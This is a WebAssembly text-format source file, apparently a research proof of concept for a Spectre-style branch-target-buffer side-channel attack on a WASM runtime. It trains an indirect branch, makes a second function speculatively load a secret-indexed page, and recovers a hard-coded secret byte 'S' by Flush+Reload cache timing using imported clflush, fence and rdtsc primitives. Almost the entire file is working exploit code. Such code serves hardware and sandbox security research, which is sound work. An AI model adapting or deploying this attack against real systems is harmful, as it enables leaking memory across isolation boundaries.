;; basic out-of-place btb. The secret byte is 83("S")

;; linear memory usage:
;; [0, 12), [128, 140) - output parameter
;; [64, 72) - rdtsc timer

(module
  (type (;0;) (func (result i32)))
  (type (;1;) (func ))
  (type (;2;) (func (param i32) (result i32)))
  (type (;3;)$param32 (func (param i32)))
  (type (;4;)(func (param i32)))
  (type (;5;)(func (result i64)))
  (import "env" "_mm_clflush" (func $__wasi_clflush_guestaddr (type 4)))
  (import "env" "_mm_clflush" (func $__wasi_clflush_hostaddr (type 4)))
  (import "env" "_mm_mfence" (func $__wasi_fence (type 1)))
  (import "env" "_rdtsc" (func $__wasi_rdtsc (type 5))) ;;rdtsc expects a pointer-to-u64 and will write the tsc value to that location
  (import "wasi_unstable" "fd_write" (func $writef (param $fd i32) (param $iovec i32) (param $len i32) (param $written i32) (result i32)))
  (table (;0;) 4 anyfunc)
  (elem (i32.const 0) $flush $fread $ftrain)
  (memory (;0;) 2024 65535) ;; pages of 65536 bytes

;;    the real version, 10000 iterations
   (func $main (export "main") (local $total_times i32)(local $times i32)(local $cache_threshold i64)
    (call $initializeMemory)
    (call $warmup)
    (call $getThreshold)
    (set_local $cache_threshold)
    (set_local $total_times (i32.const 1000000))
    (loop $L0
        ;; (call $evict)
        (call $fence)
        (set_local $times (i32.const 100))
        (loop $L1
            (call $ftrain (i32.const 1))
            (set_local $times (i32.sub (get_local $times) (i32.const 1)))
            (br_if $L1 (get_local $times))
        )
        (call $flushLinearMemory)
        (set_local $times (i32.const 10))
        (loop $L2
            (i32.const 2)
            (i32.const 1)
            (call_indirect (type $param32))
            (get_local $cache_threshold)
            (call $exfiltrate)
            (set_local $times (i32.sub (get_local $times) (i32.const 1)))
            (br_if $L2 (get_local $times))
        )
        (set_local $total_times (i32.sub (get_local $total_times) (i32.const 1)))
        (br_if $L0 (get_local $total_times))
    )
  )

  ;; the training function needs to be careful to not touch(load) any linear memory
  (func $ftrain (export "ftrain") (param $br_index i32) (local $taken_br_cond i32)
    (set_local $taken_br_cond (i32.const 99))
    (block
        ;; leave a signature on the BHB by doing enough taken conditional jumps. 35 seems to be good for both Ryzen and lakes
        ;; need to check if this gets compiled to taken branch by cranelift
        (block
            (block
                (block
                    (get_local $br_index)
                    (br_table 0 1 2 2)
                )
                (i32.store (i32.const 4096)(i32.const 4096))
            )
            ;; train the code to jump here (index 1)
            (i32.load (i32.const 2000))
            (i32.store (i32.const 83)) ;; just prevent optimization
        )
        (get_local $br_index)
        (br_if 0 (i32.eq (i32.const 1)))
        ;; padding, should not be executed
        (call $readTimer)
        (drop)
    )
    (call $noopfunc)
    (call $noopfunc)
  )

  (func $noopfunc (export "noopfunc")
  )

  (func $fread (export "fread") (param $br_index i32) (local $taken_br_cond i32)
    ;; identical to $ftrain up to the br_table
    (set_local $taken_br_cond (i32.const 99))
    (block
        (block
            (block
                (block
                    (get_local $br_index)
                    (br_table 0 1 2 2)
                )
                (i32.store (i32.const 4096)(i32.const 4096))
            )
            ;; transiently jump here
            (i32.load (i32.const 339968)) ;; 339968=83*4096; assume "S"(83) is the secret byte
            (i32.store (i32.const 83)) ;; just prevent optimization
        )
        ;; normal control flow to exit function
        ;; empty noopcall which will be patched by debugging to flush
        (get_local $br_index)
        (br_if 0 (i32.eq (i32.const 2)))
        ;; prevent optimization
        (call $readTimer)
        (drop)
    )
    (call $noopfunc)
    (call $noopfunc)
  )

  ;; /////////////////////////////////////////////////////
  ;; Helper Functions
  (func $exfiltrate (param $cache_threshold i64) (local $start_time i64) (local $end_time i64) (local $duration i64) (local $loop_index i32) (local $mix_i i32) (local $memory_index i32) (local $possible_result i32) (local $threshold i64)
    ;;
    (set_local $possible_result (i32.const 256)) ;; initialized as an impossible result
    (set_local $loop_index (i32.const 256))
    (loop $L0
        ;; avoid prefetch; mix_i = (i * 167 + 13) & 255 ; the first mix_i should be 102 for i=255, btw
        (set_local $loop_index (i32.sub (get_local $loop_index) (i32.const 1)))
        (get_local $loop_index)
        (i32.mul (i32.const 167))
        (i32.add (i32.const 13))
        (i32.and (i32.const 255))
        (set_local $mix_i)
        (get_local $mix_i)
        (i32.mul (i32.const 4096))
        (set_local $memory_index)
        (get_local $memory_index)
        ;; (call $fence)
        (call $readTimer)
        (set_local $start_time)
        ;; (call $fence)
        (i32.load)
        (drop)
        ;; (call $fence)
        (call $readTimer)
        (set_local $end_time)
        (i64.sub (get_local $end_time) (get_local $start_time))
        (set_local $duration)
        (block
            (br_if 0 (i64.gt_u (get_local $duration) (get_local $cache_threshold)))
            (call $output (get_local $mix_i))
            (set_local $possible_result (get_local $mix_i))
        )
        (call $flush (get_local $memory_index))
        (br_if $L0 (get_local $loop_index))
    )
  )

  (func $readTimer (result i64)
    ;; call timer primitive, return i64
    (call $__wasi_rdtsc)
    ;;(drop)
    ;;(i64.load (i32.const 64))
  )

  (func $fence (type 1)
    ;; call fence primitive
    (call $__wasi_fence)
    ;;(drop)
  )

  (func $flush (param $memory_index i32)
    ;; call flush primitive
    (call $__wasi_clflush_guestaddr (get_local $memory_index))
    ;;(drop)
  )

  (func $flushLinearMemory (local $loop_counter i32)
    (set_local $loop_counter (i32.const 256))
    (loop $L1
        (set_local $loop_counter (i32.sub (get_local $loop_counter) (i32.const 1)))
        (call $flush (i32.mul (get_local $loop_counter) (i32.const 4096)))
        (br_if $L1 (get_local $loop_counter))
    )
  )

  (func $getThreshold (result i64) (local $loop_counter i32) (local $start_time i64) (local $end_time i64) (local $sum i64) (local $miss_time i64)
    ;; t_cachehit * 80% + t_cachemiss * 20%. Value below this threshold is considered cached access time
    (set_local $loop_counter (i32.const 1000))
    (set_local $sum (i64.const 0))
    (call $flush (i32.const 8192))
    (call $fence)
    (call $readTimer)
    (set_local $start_time)
    ;; (call $fence)
    (i32.load (i32.const 8192))
    (drop)
    ;; (call $fence)
    (call $readTimer)
    (set_local $end_time)
    (i64.sub (get_local $end_time) (get_local $start_time))
    (set_local $miss_time)
    (loop $L0
        ;; (call $fence)
        (call $readTimer)
        (set_local $start_time)
        ;; (call $fence)
        (i32.load (i32.const 8192))
        (drop)
        ;; (call $fence)
        (call $readTimer)
        (set_local $end_time)
        (i64.sub (get_local $end_time) (get_local $start_time))
        (set_local $sum (i64.add (get_local $sum)))
        (set_local $loop_counter (i32.sub (get_local $loop_counter) (i32.const 1)))
        (br_if $L0 (get_local $loop_counter))
    )
    (i64.div_u (get_local $sum) (i64.const 1000))
    (i64.mul (i64.const 80))
    (get_local $miss_time)
    (i64.mul (i64.const 20))
    (i64.add)
    (i64.div_u (i64.const 100))
    (call $flush (i32.const 8192))
    (call $printInt)
  )

  ;; just output a single byte, better give it some char printable
  (func $output (param $value i32)
    ;; the param is a printable byte
    i32.const 0
    i32.const 128
    i32.store ;; put the parameter pointer in the linear memory. We store the parameter at 128
    i32.const 128
    get_local $value
    i32.store ;; the parameter itself
    i32.const 132
    i32.const 10 ;; linefeed
    i32.store
    i32.const 136
    i32.const 0
    i32.store
    i32.const 4 ;; iov_len
    i32.const 2
    i32.store

    (call $writef (i32.const 1) (i32.const 0) (i32.const 1) (i32.const 8))
    (drop)
  )

  (func $printInt (param $value i64) (result i64)
    ;; assume $value <= 9999: it'll only print 4 digits
    (i64.div_u (get_local $value) (i64.const 1000))
    (i64.add (i64.const 48))
    (i32.wrap_i64)
    (call $output)
    (i64.rem_u (get_local $value) (i64.const 1000))
    (i64.div_u (i64.const 100))
    (i64.add (i64.const 48))
    (i32.wrap_i64)
    (call $output)
    (i64.rem_u (get_local $value) (i64.const 100))
    (i64.div_u (i64.const 10))
    (i64.add (i64.const 48))
    (i32.wrap_i64)
    (call $output)
    (i64.rem_u (get_local $value) (i64.const 10))
    (i64.add (i64.const 48))
    (i32.wrap_i64)
    (call $output)
    (get_local $value)
  )

  (func $warmup (local $loop_counter i32) (local $start_time i64) (local $end_time i64) (local $sum i64)
    (set_local $loop_counter (i32.const 256))
    (loop $L1
        (set_local $loop_counter (i32.sub (get_local $loop_counter) (i32.const 1)))
        (i32.load (i32.mul (get_local $loop_counter) (i32.const 4096)))
        (drop)
        (call $fence)
        (call $flush (i32.mul (get_local $loop_counter) (i32.const 4096)))
        (br_if $L1 (get_local $loop_counter))
    )
    (set_local $loop_counter (i32.const 10000))
    (loop $L0
        (call $readTimer)
        (set_local $start_time)
        (call $readTimer)
        (set_local $end_time)
        (i64.sub (get_local $end_time) (get_local $start_time))
        (set_local $sum (i64.add (get_local $sum)))
        (set_local $loop_counter (i32.sub (get_local $loop_counter) (i32.const 1)))
        (br_if $L0 (get_local $loop_counter))
    )
  )

  (func $initializeMemory (local $loop_counter i32)
    (set_local $loop_counter (i32.const 256))
    (loop $L0
        (set_local $loop_counter (i32.sub (get_local $loop_counter) (i32.const 1)))
        (i32.store (i32.mul (get_local $loop_counter) (i32.const 4096)) (get_local $loop_counter))
        (call $fence)
        (call $flush (i32.mul (get_local $loop_counter) (i32.const 4096)))
        (br_if $L0 (get_local $loop_counter))
    )
  )
  ;; /////////////////////////////////////////////////////


  (export "_start" (func $main))
  (export "memory" (memory 0))
)